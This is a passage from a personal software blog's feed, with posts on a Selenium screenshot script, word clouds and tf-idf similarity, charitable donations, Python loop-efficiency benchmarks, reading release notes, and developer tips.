<span class="n">fn</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="n">uuid4</span><span class="p">())</span>

<span class="n">filename</span> <span class="o">=</span> <span class="s">'screenshot-'</span> <span class="o">+</span> <span class="n">fn</span> <span class="o">+</span> <span class="s">'.jpg'</span>
<span class="n">filepath</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">OUT_DIR</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>

<span class="bp">self</span><span class="p">.</span><span class="n">driver</span><span class="p">.</span><span class="n">execute_script</span><span class="p">(</span><span class="s">"return arguments[0].scrollIntoView();"</span><span class="p">,</span> <span class="n">el</span><span class="p">)</span>
<span class="bp">self</span><span class="p">.</span><span class="n">driver</span><span class="p">.</span><span class="n">execute_script</span><span class="p">(</span><span class="s">"window.scrollBy(0, -150);"</span><span class="p">)</span>
<span class="bp">self</span><span class="p">.</span><span class="n">driver</span><span class="p">.</span><span class="n">save_screenshot</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>

<span class="n">scroll</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">driver</span><span class="p">.</span><span class="n">execute_script</span><span class="p">(</span><span class="s">"return window.scrollY;"</span><span class="p">)</span>
<span class="n">location</span> <span class="o">=</span> <span class="n">el</span><span class="p">.</span><span class="n">location</span>
<span class="n">size</span> <span class="o">=</span> <span class="n">el</span><span class="p">.</span><span class="n">size</span>

<span class="k">if</span> <span class="n">size</span><span class="p">[</span><span class="s">'height'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">size</span><span class="p">[</span><span class="s">'width'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
    <span class="k">continue</span>

<span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>

<span class="n">left</span> <span class="o">=</span> <span class="n">location</span><span class="p">[</span><span class="s">'x'</span><span class="p">]</span>
<span class="n">top</span> <span class="o">=</span> <span class="n">location</span><span class="p">[</span><span class="s">'y'</span><span class="p">]</span> <span class="o">-</span> <span class="n">scroll</span>
<span class="n">right</span> <span class="o">=</span> <span class="n">location</span><span class="p">[</span><span class="s">'x'</span><span class="p">]</span> <span class="o">+</span> <span class="n">size</span><span class="p">[</span><span class="s">'width'</span><span class="p">]</span>
<span class="n">bottom</span> <span class="o">=</span> <span class="n">location</span><span class="p">[</span><span class="s">'y'</span><span class="p">]</span> <span class="o">+</span> <span class="n">size</span><span class="p">[</span><span class="s">'height'</span><span class="p">]</span> <span class="o">-</span> <span class="n">scroll</span>

<span class="n">im</span> <span class="o">=</span> <span class="n">im</span><span class="p">.</span><span class="n">crop</span><span class="p">((</span><span class="n">left</span><span class="p">,</span> <span class="n">top</span><span class="p">,</span> <span class="n">right</span><span class="p">,</span> <span class="n">bottom</span><span class="p">))</span>
<span class="n">im</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="n">filepath</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'.jpg'</span><span class="p">,</span> <span class="s">'-2.jpg'</span><span class="p">))</span></code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Word clouds and text similarity</title>
   <link href="http://dangoldin.com/2016/12/10/word-clouds-and-text-similarity/"/>
   <updated>2016-12-10T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/12/10/word-clouds-and-text-similarity</id>
   <content:encoded><![CDATA[
<p>I’m a sucker for data visualizations so when I came across a simple word cloud-generating <a href="https://github.com/amueller/word_cloud">Python script</a> I knew I had to give it a shot. Lucky for me I’ve been blogging fairly consistently since the beginning of 2013 and have a large text set to visualize. The first step was generating a word cloud for every single post I wrote and the second was to break it down by year. This didn’t reveal too much but got me thinking about how my writing has changed over the years. This led my discovery of a <a href="http://stackoverflow.com/questions/8897593/similarity-between-two-text-documents">script on StackOverflow</a> that works by translating each block of text into an tf-idf (term frequency - inverse document frequency) vector and then calculating the cosine distance between them. This intuitively makes sense. The tf-idf vector is used to highlight and quantify the unique words in a given document as a vector and the cosine distance is used to compare the similarities between them - if they vectors are equivalent the angle between them is 0 which has a cosine of 1. Turns out that high school math is incredibly useful.</p>

<ul class="thumbnails">
    <li>
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/combined-wordcloud.png" alt="Combined word cloud" width="1600" height="1600" layout="responsive"/>
            <p>A word cloud across every blog post.</p>
        </div>
    </li>

    <li>
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/combined-wordcloud-2008.png" alt="Combined word cloud 2008" width="1600" height="1600" layout="responsive"/>
            <p>A word cloud for 2008 blog posts.</p>
        </div>
    </li>

    <li>
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/combined-wordcloud-2009.png" alt="Combined word cloud 2009" width="1600" height="1600" layout="responsive"/>
            <p>A word cloud for 2009 blog posts.</p>
        </div>
    </li>

    <li>
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/combined-wordcloud-2010.png" alt="Combined word cloud 2010" width="1600" height="1600" layout="responsive"/>
            <p>A word cloud for 2010 blog posts.</p>
        </div>
    </li>

    <li>
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/combined-wordcloud-2011.png" alt="Combined word cloud 2011" width="1600" height="1600" layout="responsive"/>
            <p>A word cloud for 2011 blog posts.</p>
        </div>
    </li>

    <li>
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/combined-wordcloud-2012.png" alt="Combined word cloud 2012" width="1600" height="1600" layout="responsive"/>
            <p>A word cloud for 2012 blog posts.</p>
        </div>
    </li>

    <li>
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/combined-wordcloud-2013.png" alt="Combined word cloud 2013" width="1600" height="1600" layout="responsive"/>
            <p>A word cloud for 2013 blog posts.</p>
        </div>
    </li>

    <li>
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/combined-wordcloud-2014.png" alt="Combined word cloud 2014" width="1600" height="1600" layout="responsive"/>
            <p>A word cloud for 2014 blog posts.</p>
        </div>
    </li>

    <li>
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/combined-wordcloud-2015.png" alt="Combined word cloud 2015" width="1600" height="1600" layout="responsive"/>
            <p>A word cloud for 2015 blog posts.</p>
        </div>
    </li>

    <li>
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/combined-wordcloud-2016.png" alt="Combined word cloud 2016" width="1600" height="1600" layout="responsive"/>
            <p>A word cloud for 2016 blog posts.</p>
        </div>
    </li>

    <li>
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/blogging-similiary-2008-2016.png" alt="Blog post similarity 2008-2016" width="2648" height="706" layout="responsive"/>
            <p>Blog post similariy between 2008 and 2016. It's shocking to see how similar my blog posts have been since 2014. Based on the word clouds it seems all I write about is code and data.</p>
        </div>
    </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>It's donation season</title>
   <link href="http://dangoldin.com/2016/12/09/its-donation-season/"/>
   <updated>2016-12-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/12/09/its-donation-season</id>
   <content:encoded><![CDATA[
<p>It’s that time of the year when many organizations are ramping up their donation efforts and I wanted to share the organizations I donate money to. I feel incredibly lucky to be where I am and being able to donate to worthy causes is a great way to pay it forward. Everyone is passionate about something and donating to that cause is incredibly worthwhile and valuable.</p>

<p><a href="https://www.wikipedia.org/">Wikipedia</a>. The need for education is critical to a functioning society and unfortunately this has been magnified recently by the explosion of fake news. Wikipedia is incredible at providing factual information and I find myself visiting it multiple times a day. It’s both education and entertainment since it’s just so easy to get lost in its labyrinth. Out of all the tools and services I pay for Wikipedia offers by far the highest return.</p>

<p><a href="https://www.aclu.org/">American Civil Liberties Union</a>. Especially over the next few years our rights will be incredibly important and the work the ACLU is doing is a key part in making sure they exist in the future. Democracy is being challenge around the world and keeping it safe is something we need to do for future generations. Rather than losing our liberties one small piece at a time the ACLU needs the ability to engage in the small skirmishes and battles that strengthen our freedoms.</p>

<p><a href="https://www.eff.org/">Electronic Frontier Foundation</a>. Being in the tech industry I like to think I understand the dangers of technology better than most and the EFF has both an increasingly important and increasingly difficult job ahead. Technology has eliminated friction across the globe and democratized a wealth of information but the flipside is that it makes it incredibly easy for governments and agencies to monitor our digital worlds. This will be a bigger and bigger issue as more and more of our lives are captured digitally and the EFF is the bulwark keeping them secure.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Efficiency vs expressiveness</title>
   <link href="http://dangoldin.com/2016/12/06/efficiency-vs-expressiveness/"/>
   <updated>2016-12-06T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/12/06/efficiency-vs-expressiveness</id>
   <content:encoded><![CDATA[
<p>The ideal code is both efficient and expressive but they’re often at odds with one another. Last week I was working on a <a href="https://github.com/dangoldin/aws-billing-details-analysis/blob/master/analyze_aws_details.py">simple script</a> to parse and visualize a detailed AWS bill across a variety of dimensions and came across a clear example. The script loads a CSV file into a Pandas dataframe and adds a few columns based on the values of some others. The challenge is that the CSV file can be millions of rows so minor improvements can lead to significant efficiency gains. Given this quick overview the code below should make sense but there are two functions that each iterate through the values of the same column in order to generate two additional columns.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python">    <span class="k">def</span> <span class="nf">add_usage_type_group</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">d</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">d</span>
        <span class="c1"># Get rid of the nan
</span>        <span class="n">all_usage_types</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">d</span><span class="p">[</span><span class="s">'UsageType'</span><span class="p">].</span><span class="n">unique</span><span class="p">()</span> <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">==</span> <span class="nb">str</span><span class="p">)</span>
        <span class="n">d</span><span class="p">[</span><span class="s">'usage_type_group'</span><span class="p">]</span> <span class="o">=</span> <span class="s">''</span>

        <span class="c1"># Simple group assignment using substring
</span>        <span class="n">usage_groups</span> <span class="o">=</span> <span class="p">[</span><span class="s">'DataTransfer'</span><span class="p">,</span> <span class="s">'Requests'</span><span class="p">,</span> <span class="s">'In-Bytes'</span><span class="p">,</span> <span class="s">'Out-Bytes'</span><span class="p">,</span> <span class="s">'BoxUsage'</span><span class="p">]</span>
        <span class="k">for</span> <span class="n">usage_type</span> <span class="ow">in</span> <span class="n">all_usage_types</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">usage_group</span> <span class="ow">in</span> <span class="n">usage_groups</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">usage_group</span> <span class="ow">in</span> <span class="n">usage_type</span><span class="p">:</span>
                    <span class="n">d</span><span class="p">.</span><span class="n">usage_type_group</span><span class="p">[</span> <span class="n">d</span><span class="p">[</span><span class="s">'UsageType'</span><span class="p">]</span> <span class="o">==</span> <span class="n">usage_type</span> <span class="p">]</span> <span class="o">=</span> <span class="n">usage_group</span>
                <span class="k">continue</span>

    <span class="k">def</span> <span class="nf">add_instance_type</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">d</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">d</span>
        <span class="c1"># Extract from usage type which will be like "APS1-BoxUsage:c4.large"
</span>        <span class="n">all_usage_types</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">d</span><span class="p">[</span><span class="s">'UsageType'</span><span class="p">].</span><span class="n">unique</span><span class="p">()</span> <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">==</span> <span class="nb">str</span><span class="p">)</span>
        <span class="n">d</span><span class="p">[</span><span class="s">'instance_type'</span><span class="p">]</span> <span class="o">=</span> <span class="s">''</span>

        <span class="k">for</span> <span class="n">usage_type</span> <span class="ow">in</span> <span class="n">all_usage_types</span><span class="p">:</span>
            <span class="k">if</span> <span class="s">'BoxUsage'</span> <span class="ow">in</span> <span class="n">usage_type</span><span class="p">:</span>
                <span class="n">instance_type</span> <span class="o">=</span> <span class="n">usage_type</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
                <span class="n">d</span><span class="p">.</span><span class="n">instance_type</span><span class="p">[</span> <span class="n">d</span><span class="p">[</span><span class="s">'UsageType'</span><span class="p">]</span> <span class="o">==</span> <span class="n">usage_type</span> <span class="p">]</span> <span class="o">=</span> <span class="n">instance_type</span></code></pre></figure>

<p>As one can see the outer for loop is shared but the inner logic is different. If all I cared about was efficiency I’d be able to combine the two functions but then I’d lose the separation of concerns. I can also rewrite the code to be more functional and have a single method that takes a list of functions to apply as arguments but that would but in this case would look messy. I wish I didn’t have to sacrifice efficiency for expressiveness and would love a language that was smart enough to handle this sort of optimization. The JVM does a series of optimizations as it runs so it may come close but I wonder if there’s any language that can do this optimization at compile time.</p>

<p>I was also a bit curious about this issue and wrote a toy <a href="https://github.com/dangoldin/code-samples/blob/master/iteration_filter_testing.py">Python script</a> to compare the various implementations of a simple for loop filter. The data reinforces this conflict between efficiency and expressiveness. The script generates a random integer array and then filters it down to two smaller arrays - one for numbers divisible by 100 and one for numbers divisible by 200. The naive way is to do a single for loop and then have if statements for each condition but the slightly improved version is to realize that 200 is a multiple of 100 and one can nest that check. The more Pythonic way of doing these is through a list comprehension and I gave that shot as well. The last attempt was even more functional and do the exercise using a filter/lambda combination.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#! /usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">timeit</span>

<span class="n">TEST_LIST_SIZE</span> <span class="o">=</span> <span class="mi">100000</span>
<span class="n">NUM_ITERATIONS</span> <span class="o">=</span> <span class="mi">1000</span>

<span class="k">def</span> <span class="nf">generate_random_list</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">random</span><span class="p">.</span><span class="n">sample</span><span class="p">(</span><span class="nb">xrange</span><span class="p">(</span><span class="n">size</span><span class="p">),</span> <span class="n">size</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">naive_simple</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">b</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">100</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">a</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">200</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">b</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span>

<span class="k">def</span> <span class="nf">naive_smart</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">b</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">100</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">a</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">200</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">b</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span>

<span class="k">def</span> <span class="nf">filter_single</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">l</span> <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">filter_multiple</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">list_n</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">[</span>
        <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">l</span> <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">list_n</span>
    <span class="p">]</span>

<span class="k">def</span> <span class="nf">filter_lambda_single</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="o">%</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">naive_simple_test</span><span class="p">():</span>
    <span class="n">l</span> <span class="o">=</span> <span class="n">generate_random_list</span><span class="p">(</span><span class="n">TEST_LIST_SIZE</span><span class="p">)</span>
    <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">naive_simple</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">naive_smart_test</span><span class="p">():</span>
    <span class="n">l</span> <span class="o">=</span> <span class="n">generate_random_list</span><span class="p">(</span><span class="n">TEST_LIST_SIZE</span><span class="p">)</span>
    <span class="n">a1</span><span class="p">,</span> <span class="n">b1</span> <span class="o">=</span> <span class="n">naive_smart</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">filter_single_test</span><span class="p">():</span>
    <span class="n">l</span> <span class="o">=</span> <span class="n">generate_random_list</span><span class="p">(</span><span class="n">TEST_LIST_SIZE</span><span class="p">)</span>
    <span class="n">a2</span><span class="p">,</span> <span class="n">b2</span> <span class="o">=</span> <span class="n">filter_single</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="mi">100</span><span class="p">),</span> <span class="n">filter_single</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">filter_multiple_test</span><span class="p">():</span>
    <span class="n">l</span> <span class="o">=</span> <span class="n">generate_random_list</span><span class="p">(</span><span class="n">TEST_LIST_SIZE</span><span class="p">)</span>
    <span class="n">a3</span><span class="p">,</span> <span class="n">b3</span> <span class="o">=</span> <span class="n">filter_multiple</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="p">[</span><span class="mi">100</span><span class="p">,</span><span class="mi">200</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">filter_lambda_single_test</span><span class="p">():</span>
    <span class="n">l</span> <span class="o">=</span> <span class="n">generate_random_list</span><span class="p">(</span><span class="n">TEST_LIST_SIZE</span><span class="p">)</span>
    <span class="n">a4</span><span class="p">,</span> <span class="n">b4</span> <span class="o">=</span> <span class="n">filter_lambda_single</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="mi">100</span><span class="p">),</span> <span class="n">filter_lambda_single</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">l</span> <span class="o">=</span> <span class="n">generate_random_list</span><span class="p">(</span><span class="n">TEST_LIST_SIZE</span><span class="p">)</span>

    <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">naive_simple</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>

    <span class="n">a1</span><span class="p">,</span> <span class="n">b1</span> <span class="o">=</span> <span class="n">naive_smart</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>

    <span class="n">a2</span><span class="p">,</span> <span class="n">b2</span> <span class="o">=</span> <span class="n">filter_single</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="mi">100</span><span class="p">),</span> <span class="n">filter_single</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>

    <span class="n">a3</span><span class="p">,</span> <span class="n">b3</span> <span class="o">=</span> <span class="n">filter_multiple</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="p">[</span><span class="mi">100</span><span class="p">,</span><span class="mi">200</span><span class="p">])</span>

    <span class="n">a4</span><span class="p">,</span> <span class="n">b4</span> <span class="o">=</span> <span class="n">filter_lambda_single</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="mi">100</span><span class="p">),</span> <span class="n">filter_lambda_single</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>

    <span class="k">print</span> <span class="s">'Comparison tests'</span>
    <span class="k">print</span> <span class="n">a</span> <span class="o">==</span> <span class="n">a1</span>
    <span class="k">print</span> <span class="n">b</span> <span class="o">==</span> <span class="n">b1</span>

    <span class="k">print</span> <span class="n">a1</span> <span class="o">==</span> <span class="n">a2</span>
    <span class="k">print</span> <span class="n">b1</span> <span class="o">==</span> <span class="n">b2</span>

    <span class="k">print</span> <span class="n">a2</span> <span class="o">==</span> <span class="n">a3</span>
    <span class="k">print</span> <span class="n">b2</span> <span class="o">==</span> <span class="n">b3</span>

    <span class="k">print</span> <span class="n">a3</span> <span class="o">==</span> <span class="n">a4</span>
    <span class="k">print</span> <span class="n">b3</span> <span class="o">==</span> <span class="n">b4</span>

    <span class="k">print</span> <span class="s">'Timing tests'</span>
    <span class="k">print</span> <span class="s">'Array generation'</span><span class="p">,</span> <span class="n">timeit</span><span class="p">.</span><span class="n">timeit</span><span class="p">(</span><span class="s">'generate_random_list(TEST_LIST_SIZE)'</span><span class="p">,</span> <span class="s">'from __main__ import generate_random_list, TEST_LIST_SIZE'</span><span class="p">,</span> <span class="n">number</span><span class="o">=</span><span class="n">NUM_ITERATIONS</span><span class="p">)</span>
    <span class="k">print</span> <span class="s">'Naive simple'</span><span class="p">,</span> <span class="n">timeit</span><span class="p">.</span><span class="n">timeit</span><span class="p">(</span><span class="s">'naive_simple_test()'</span><span class="p">,</span> <span class="s">'from __main__ import naive_simple_test'</span><span class="p">,</span> <span class="n">number</span><span class="o">=</span><span class="n">NUM_ITERATIONS</span><span class="p">)</span>
    <span class="k">print</span> <span class="s">'Naive smart'</span><span class="p">,</span> <span class="n">timeit</span><span class="p">.</span><span class="n">timeit</span><span class="p">(</span><span class="s">'naive_smart_test()'</span><span class="p">,</span> <span class="s">'from __main__ import naive_smart_test'</span><span class="p">,</span> <span class="n">number</span><span class="o">=</span><span class="n">NUM_ITERATIONS</span><span class="p">)</span>
    <span class="k">print</span> <span class="s">'Filter single'</span><span class="p">,</span> <span class="n">timeit</span><span class="p">.</span><span class="n">timeit</span><span class="p">(</span><span class="s">'filter_single_test()'</span><span class="p">,</span> <span class="s">'from __main__ import filter_single_test'</span><span class="p">,</span> <span class="n">number</span><span class="o">=</span><span class="n">NUM_ITERATIONS</span><span class="p">)</span>
    <span class="k">print</span> <span class="s">'Filter multiple'</span><span class="p">,</span> <span class="n">timeit</span><span class="p">.</span><span class="n">timeit</span><span class="p">(</span><span class="s">'filter_multiple_test()'</span><span class="p">,</span> <span class="s">'from __main__ import filter_multiple_test'</span><span class="p">,</span> <span class="n">number</span><span class="o">=</span><span class="n">NUM_ITERATIONS</span><span class="p">)</span>
    <span class="k">print</span> <span class="s">'Filter lambda single'</span><span class="p">,</span> <span class="n">timeit</span><span class="p">.</span><span class="n">timeit</span><span class="p">(</span><span class="s">'filter_lambda_single_test()'</span><span class="p">,</span> <span class="s">'from __main__ import filter_lambda_single_test'</span><span class="p">,</span> <span class="n">number</span><span class="o">=</span><span class="n">NUM_ITERATIONS</span><span class="p">)</span></code></pre></figure>

<p>The benchmarks are below and the results are intuitive. The quickest implementation was the single for loop with the nested if conditions and the slowest was the filter/lambda approach. Surprisingly, the other approaches were similar despite the single naive for loop only iterating over the array once while the list comprehensions iterating over the array twice. If we increase the size of the array we do see a bigger benefit coming from the single pass over the array.</p>

<h4 id="array-size-10000-iterations-10000">Array size: 10,000; Iterations: 10,000</h4>

<table>
  <thead>
    <tr>
      <th>Implementation</th>
      <th>Time (sec)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Array generation</td>
      <td>56.21</td>
    </tr>
    <tr>
      <td>Naive simple</td>
      <td>73.51</td>
    </tr>
    <tr>
      <td>Naive smart</td>
      <td>64.11</td>
    </tr>
    <tr>
      <td>Filter single</td>
      <td>71.92</td>
    </tr>
    <tr>
      <td>Filter multiple</td>
      <td>71.19</td>
    </tr>
    <tr>
      <td>Filter lambda single</td>
      <td>91.34</td>
    </tr>
  </tbody>
</table>

<h4 id="array-size-100000-iterations-1000">Array size: 100,000; Iterations: 1,000</h4>

<table>
  <thead>
    <tr>
      <th>Implementation</th>
      <th>Time (sec)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Array generation</td>
      <td>63.96</td>
    </tr>
    <tr>
      <td>Naive simple</td>
      <td>78.74</td>
    </tr>
    <tr>
      <td>Naive smart</td>
      <td>71.13</td>
    </tr>
    <tr>
      <td>Filter single</td>
      <td>82.19</td>
    </tr>
    <tr>
      <td>Filter multiple</td>
      <td>81.86</td>
    </tr>
    <tr>
      <td>Filter lambda single</td>
      <td>109.44</td>
    </tr>
  </tbody>
</table>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Read the release notes</title>
   <link href="http://dangoldin.com/2016/12/03/read-the-release-notes/"/>
   <updated>2016-12-03T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/12/03/read-the-release-notes</id>
   <content:encoded><![CDATA[
<p>I often find myself upgrading an open source to a newer version but I have a bad habit to only skim the release notes. More often than not an upgrade will work out of the box and you’ll get the immediate benefits of the newer version but every once in a while things blow up and you need to revert or scramble to get a fix out. Reading documentation tends to be dry with only a few relevant parts but when working on large systems it’s paramount to go through and understand the nuances of every upgrade. During my career I’ve run into a variety of issues that could have been avoided by a thorough reading of the release notes. There’s still a chance you’ll miss something and that’s why you should always have a sandbox environment and try to containerize as much as you can. Below are a few examples of issues I’ve run into upgrading various applications over the past few months:</p>

<ul>
  <li><strong>Kafka 0.8 to 0.10</strong>. This wasn’t a true upgrade but we wanted to spin up a parallel Kafka cluster that was a significant departure from our previous version. Kafka is a complicated application and we assumed that our code was backwards compatible. This was half-true. The code worked but it took a major performance hit that was <a href="http://kafka.apache.org/0100/documentation.html#upgrade_10_performance_impact">clearly document</a> in the release notes.</li>
  <li><strong>Mongo/PHP</strong>: This was a simple case of not reading the compatibility chart between the different versions of Mongo, PHP, and the associated drivers. If you’re running an old version of PHP you are limited to a subset of drivers that don’t support the latest version of Mongo. Once again this was discovered when messing around on our sand environment.</li>
  <li><strong>Sentry</strong>: Sentry’s a wonderful product that collects errors from every application you’re running and consolidates them into a single, slick UI. We wanted to get the benefit of a few additional plugins and decided to upgrade it to the latest version. Lucky for us there were some significant changes that required us to install a variety of build tools, including the C compiler. Unexpected but quickly remedied.</li>
</ul>

<p>In our desire to get the latest and greatest we should be taking a step back to weight the benefits and the risks and looking at the release notes is a great way of understanding the potential impact. Even then it’s critical to have a separate environment to test different versions and a plan to roll back since it’s impossible to know what may actually happen on your unique system and configuration.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Becoming a better developer</title>
   <link href="http://dangoldin.com/2016/11/30/becoming-a-better-developer/"/>
   <updated>2016-11-30T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/11/30/becoming-a-better-developer</id>
   <content:encoded><![CDATA[
<p>Yesterday I had the privilege of giving a talk at <a href="http://www.hackreactor.com/">HackReactor</a> titled “Things I wish I knew” which was an amalgam of the various themes and topics I’ve been blogging and thinking about. While going through the blog I came up with two themes for the topic - the first was tactics that would make someone a better programmer immediately and the second was how to improve as a developer over time.</p>

<h3 id="short-term-tips-to-become-a-better-programmer">Short term tips to become a better programmer</h3>
<ul>
  <li><strong><a href="http://dangoldin.com/2016/04/07/generalize-at-n3/">Generalize at n=3</a></strong>. Rather than coming up with the perfect abstract solution right away my rule of thumb is to start thinking about that on your third iteration of solving the same problem. This will ensure you’re solving a problem that will recur while giving you enough perspective to actually develop a useful abstract solution.</li>
  <li><strong><a href="http://dangoldin.com/2016/02/15/design-your-database-for-flexibility/">Think carefully about your database</a></strong>. Compared to changing a database changing code is much simpler. Code is mostly stateless and you don’t need to worry about backfills or migrations.</li>
